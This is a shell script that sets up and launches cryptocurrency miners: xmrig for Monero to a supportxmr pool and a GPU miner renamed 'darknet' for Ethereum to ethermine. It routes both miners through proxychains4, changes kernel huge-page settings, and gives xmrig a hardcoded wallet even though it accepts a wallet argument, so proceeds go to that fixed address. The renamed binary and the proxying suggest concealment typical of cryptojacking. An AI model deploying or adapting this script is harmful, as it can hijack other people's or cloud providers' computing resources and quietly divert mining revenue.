#!/bin/sh
apt-get update -y
apt-get install -y --no-install-recommends apt-utils
apt install build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl -y
apt install libpci-dev -y
apt install libssl-dev -y
worker_name=$1
wallet=$2
WALLET=86fQy4W7vXLEyLnMSvGopqfQbhZRAfF3CguZWKckMSFKV25Z9443rDKbSGnDGDKzsSYxF5iPyvJpdD7xZQYSodzKR7LyYAN
POOL=pool.supportxmr.com:5555
thread=$(grep ^cpu\\scores /proc/cpuinfo | uniq |  awk '{print $4}')
run_thread=$((thread * 2 - 1))

sysctl -w vm.nr_hugepages=$(nproc)

for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
do
    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
done

echo "1GB pages successfully enabled"

proxychains4 ./xmrig --url=$POOL --donate-level=1 --user=$WALLET --pass=worker_name -k --coin=monero --threads $run_thread &
#./xmrig --url=$POOL --donate-level=1 --user=$WALLET --pass=ggcloud -k --coin=monero --max-cpu-usage=100 &
echo "run darknet"
proxychains4 ./darknet -pool eu1.ethermine.org:4444 -wal $wallet -worker $worker_name -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
ip=$(curl ipinfo.io)
while true
do
  ps aux | grep darknet
  ps aux | grep xmrig
  nvidia-smi
  echo $ip
  sleep 10
done